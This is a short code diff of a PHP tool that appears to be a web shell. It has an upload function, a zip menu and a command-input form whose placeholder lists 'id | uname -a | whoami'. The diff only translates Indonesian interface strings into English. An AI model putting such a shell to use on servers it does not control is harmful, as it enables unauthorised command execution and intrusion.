@@ -262,7 +262,7 @@ function aksiUpload($dir){
     if($jumlah < 2){
       if($up){
         $swa = "success";
-        $text = "Berhasil Upload $filename";
+        $text = "Upload Succeed $filename";
         swall($swa,$text,$dir);
       }else{
         $swa = "error";
@@ -271,7 +271,7 @@ function aksiUpload($dir){
       }
     }else{
       $swa = "success";
-      $text = "Berhasil Upload $jumlah File";
+      $text = "Upload Succeed $jumlah File";
       swall($swa,$text,$dir);
     }
   }
@@ -2134,7 +2134,7 @@ function zipMenu($dir,$file){
             <input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | heked">
           </form>
           <hr/>
-          <h5><i class="fa fa-search"></i> Informasi : </h5>
+          <h5><i class="fa fa-search"></i> Information : </h5>
           <div class="card table-responsive">
             <div class="card-body">
               <table class="table infor">
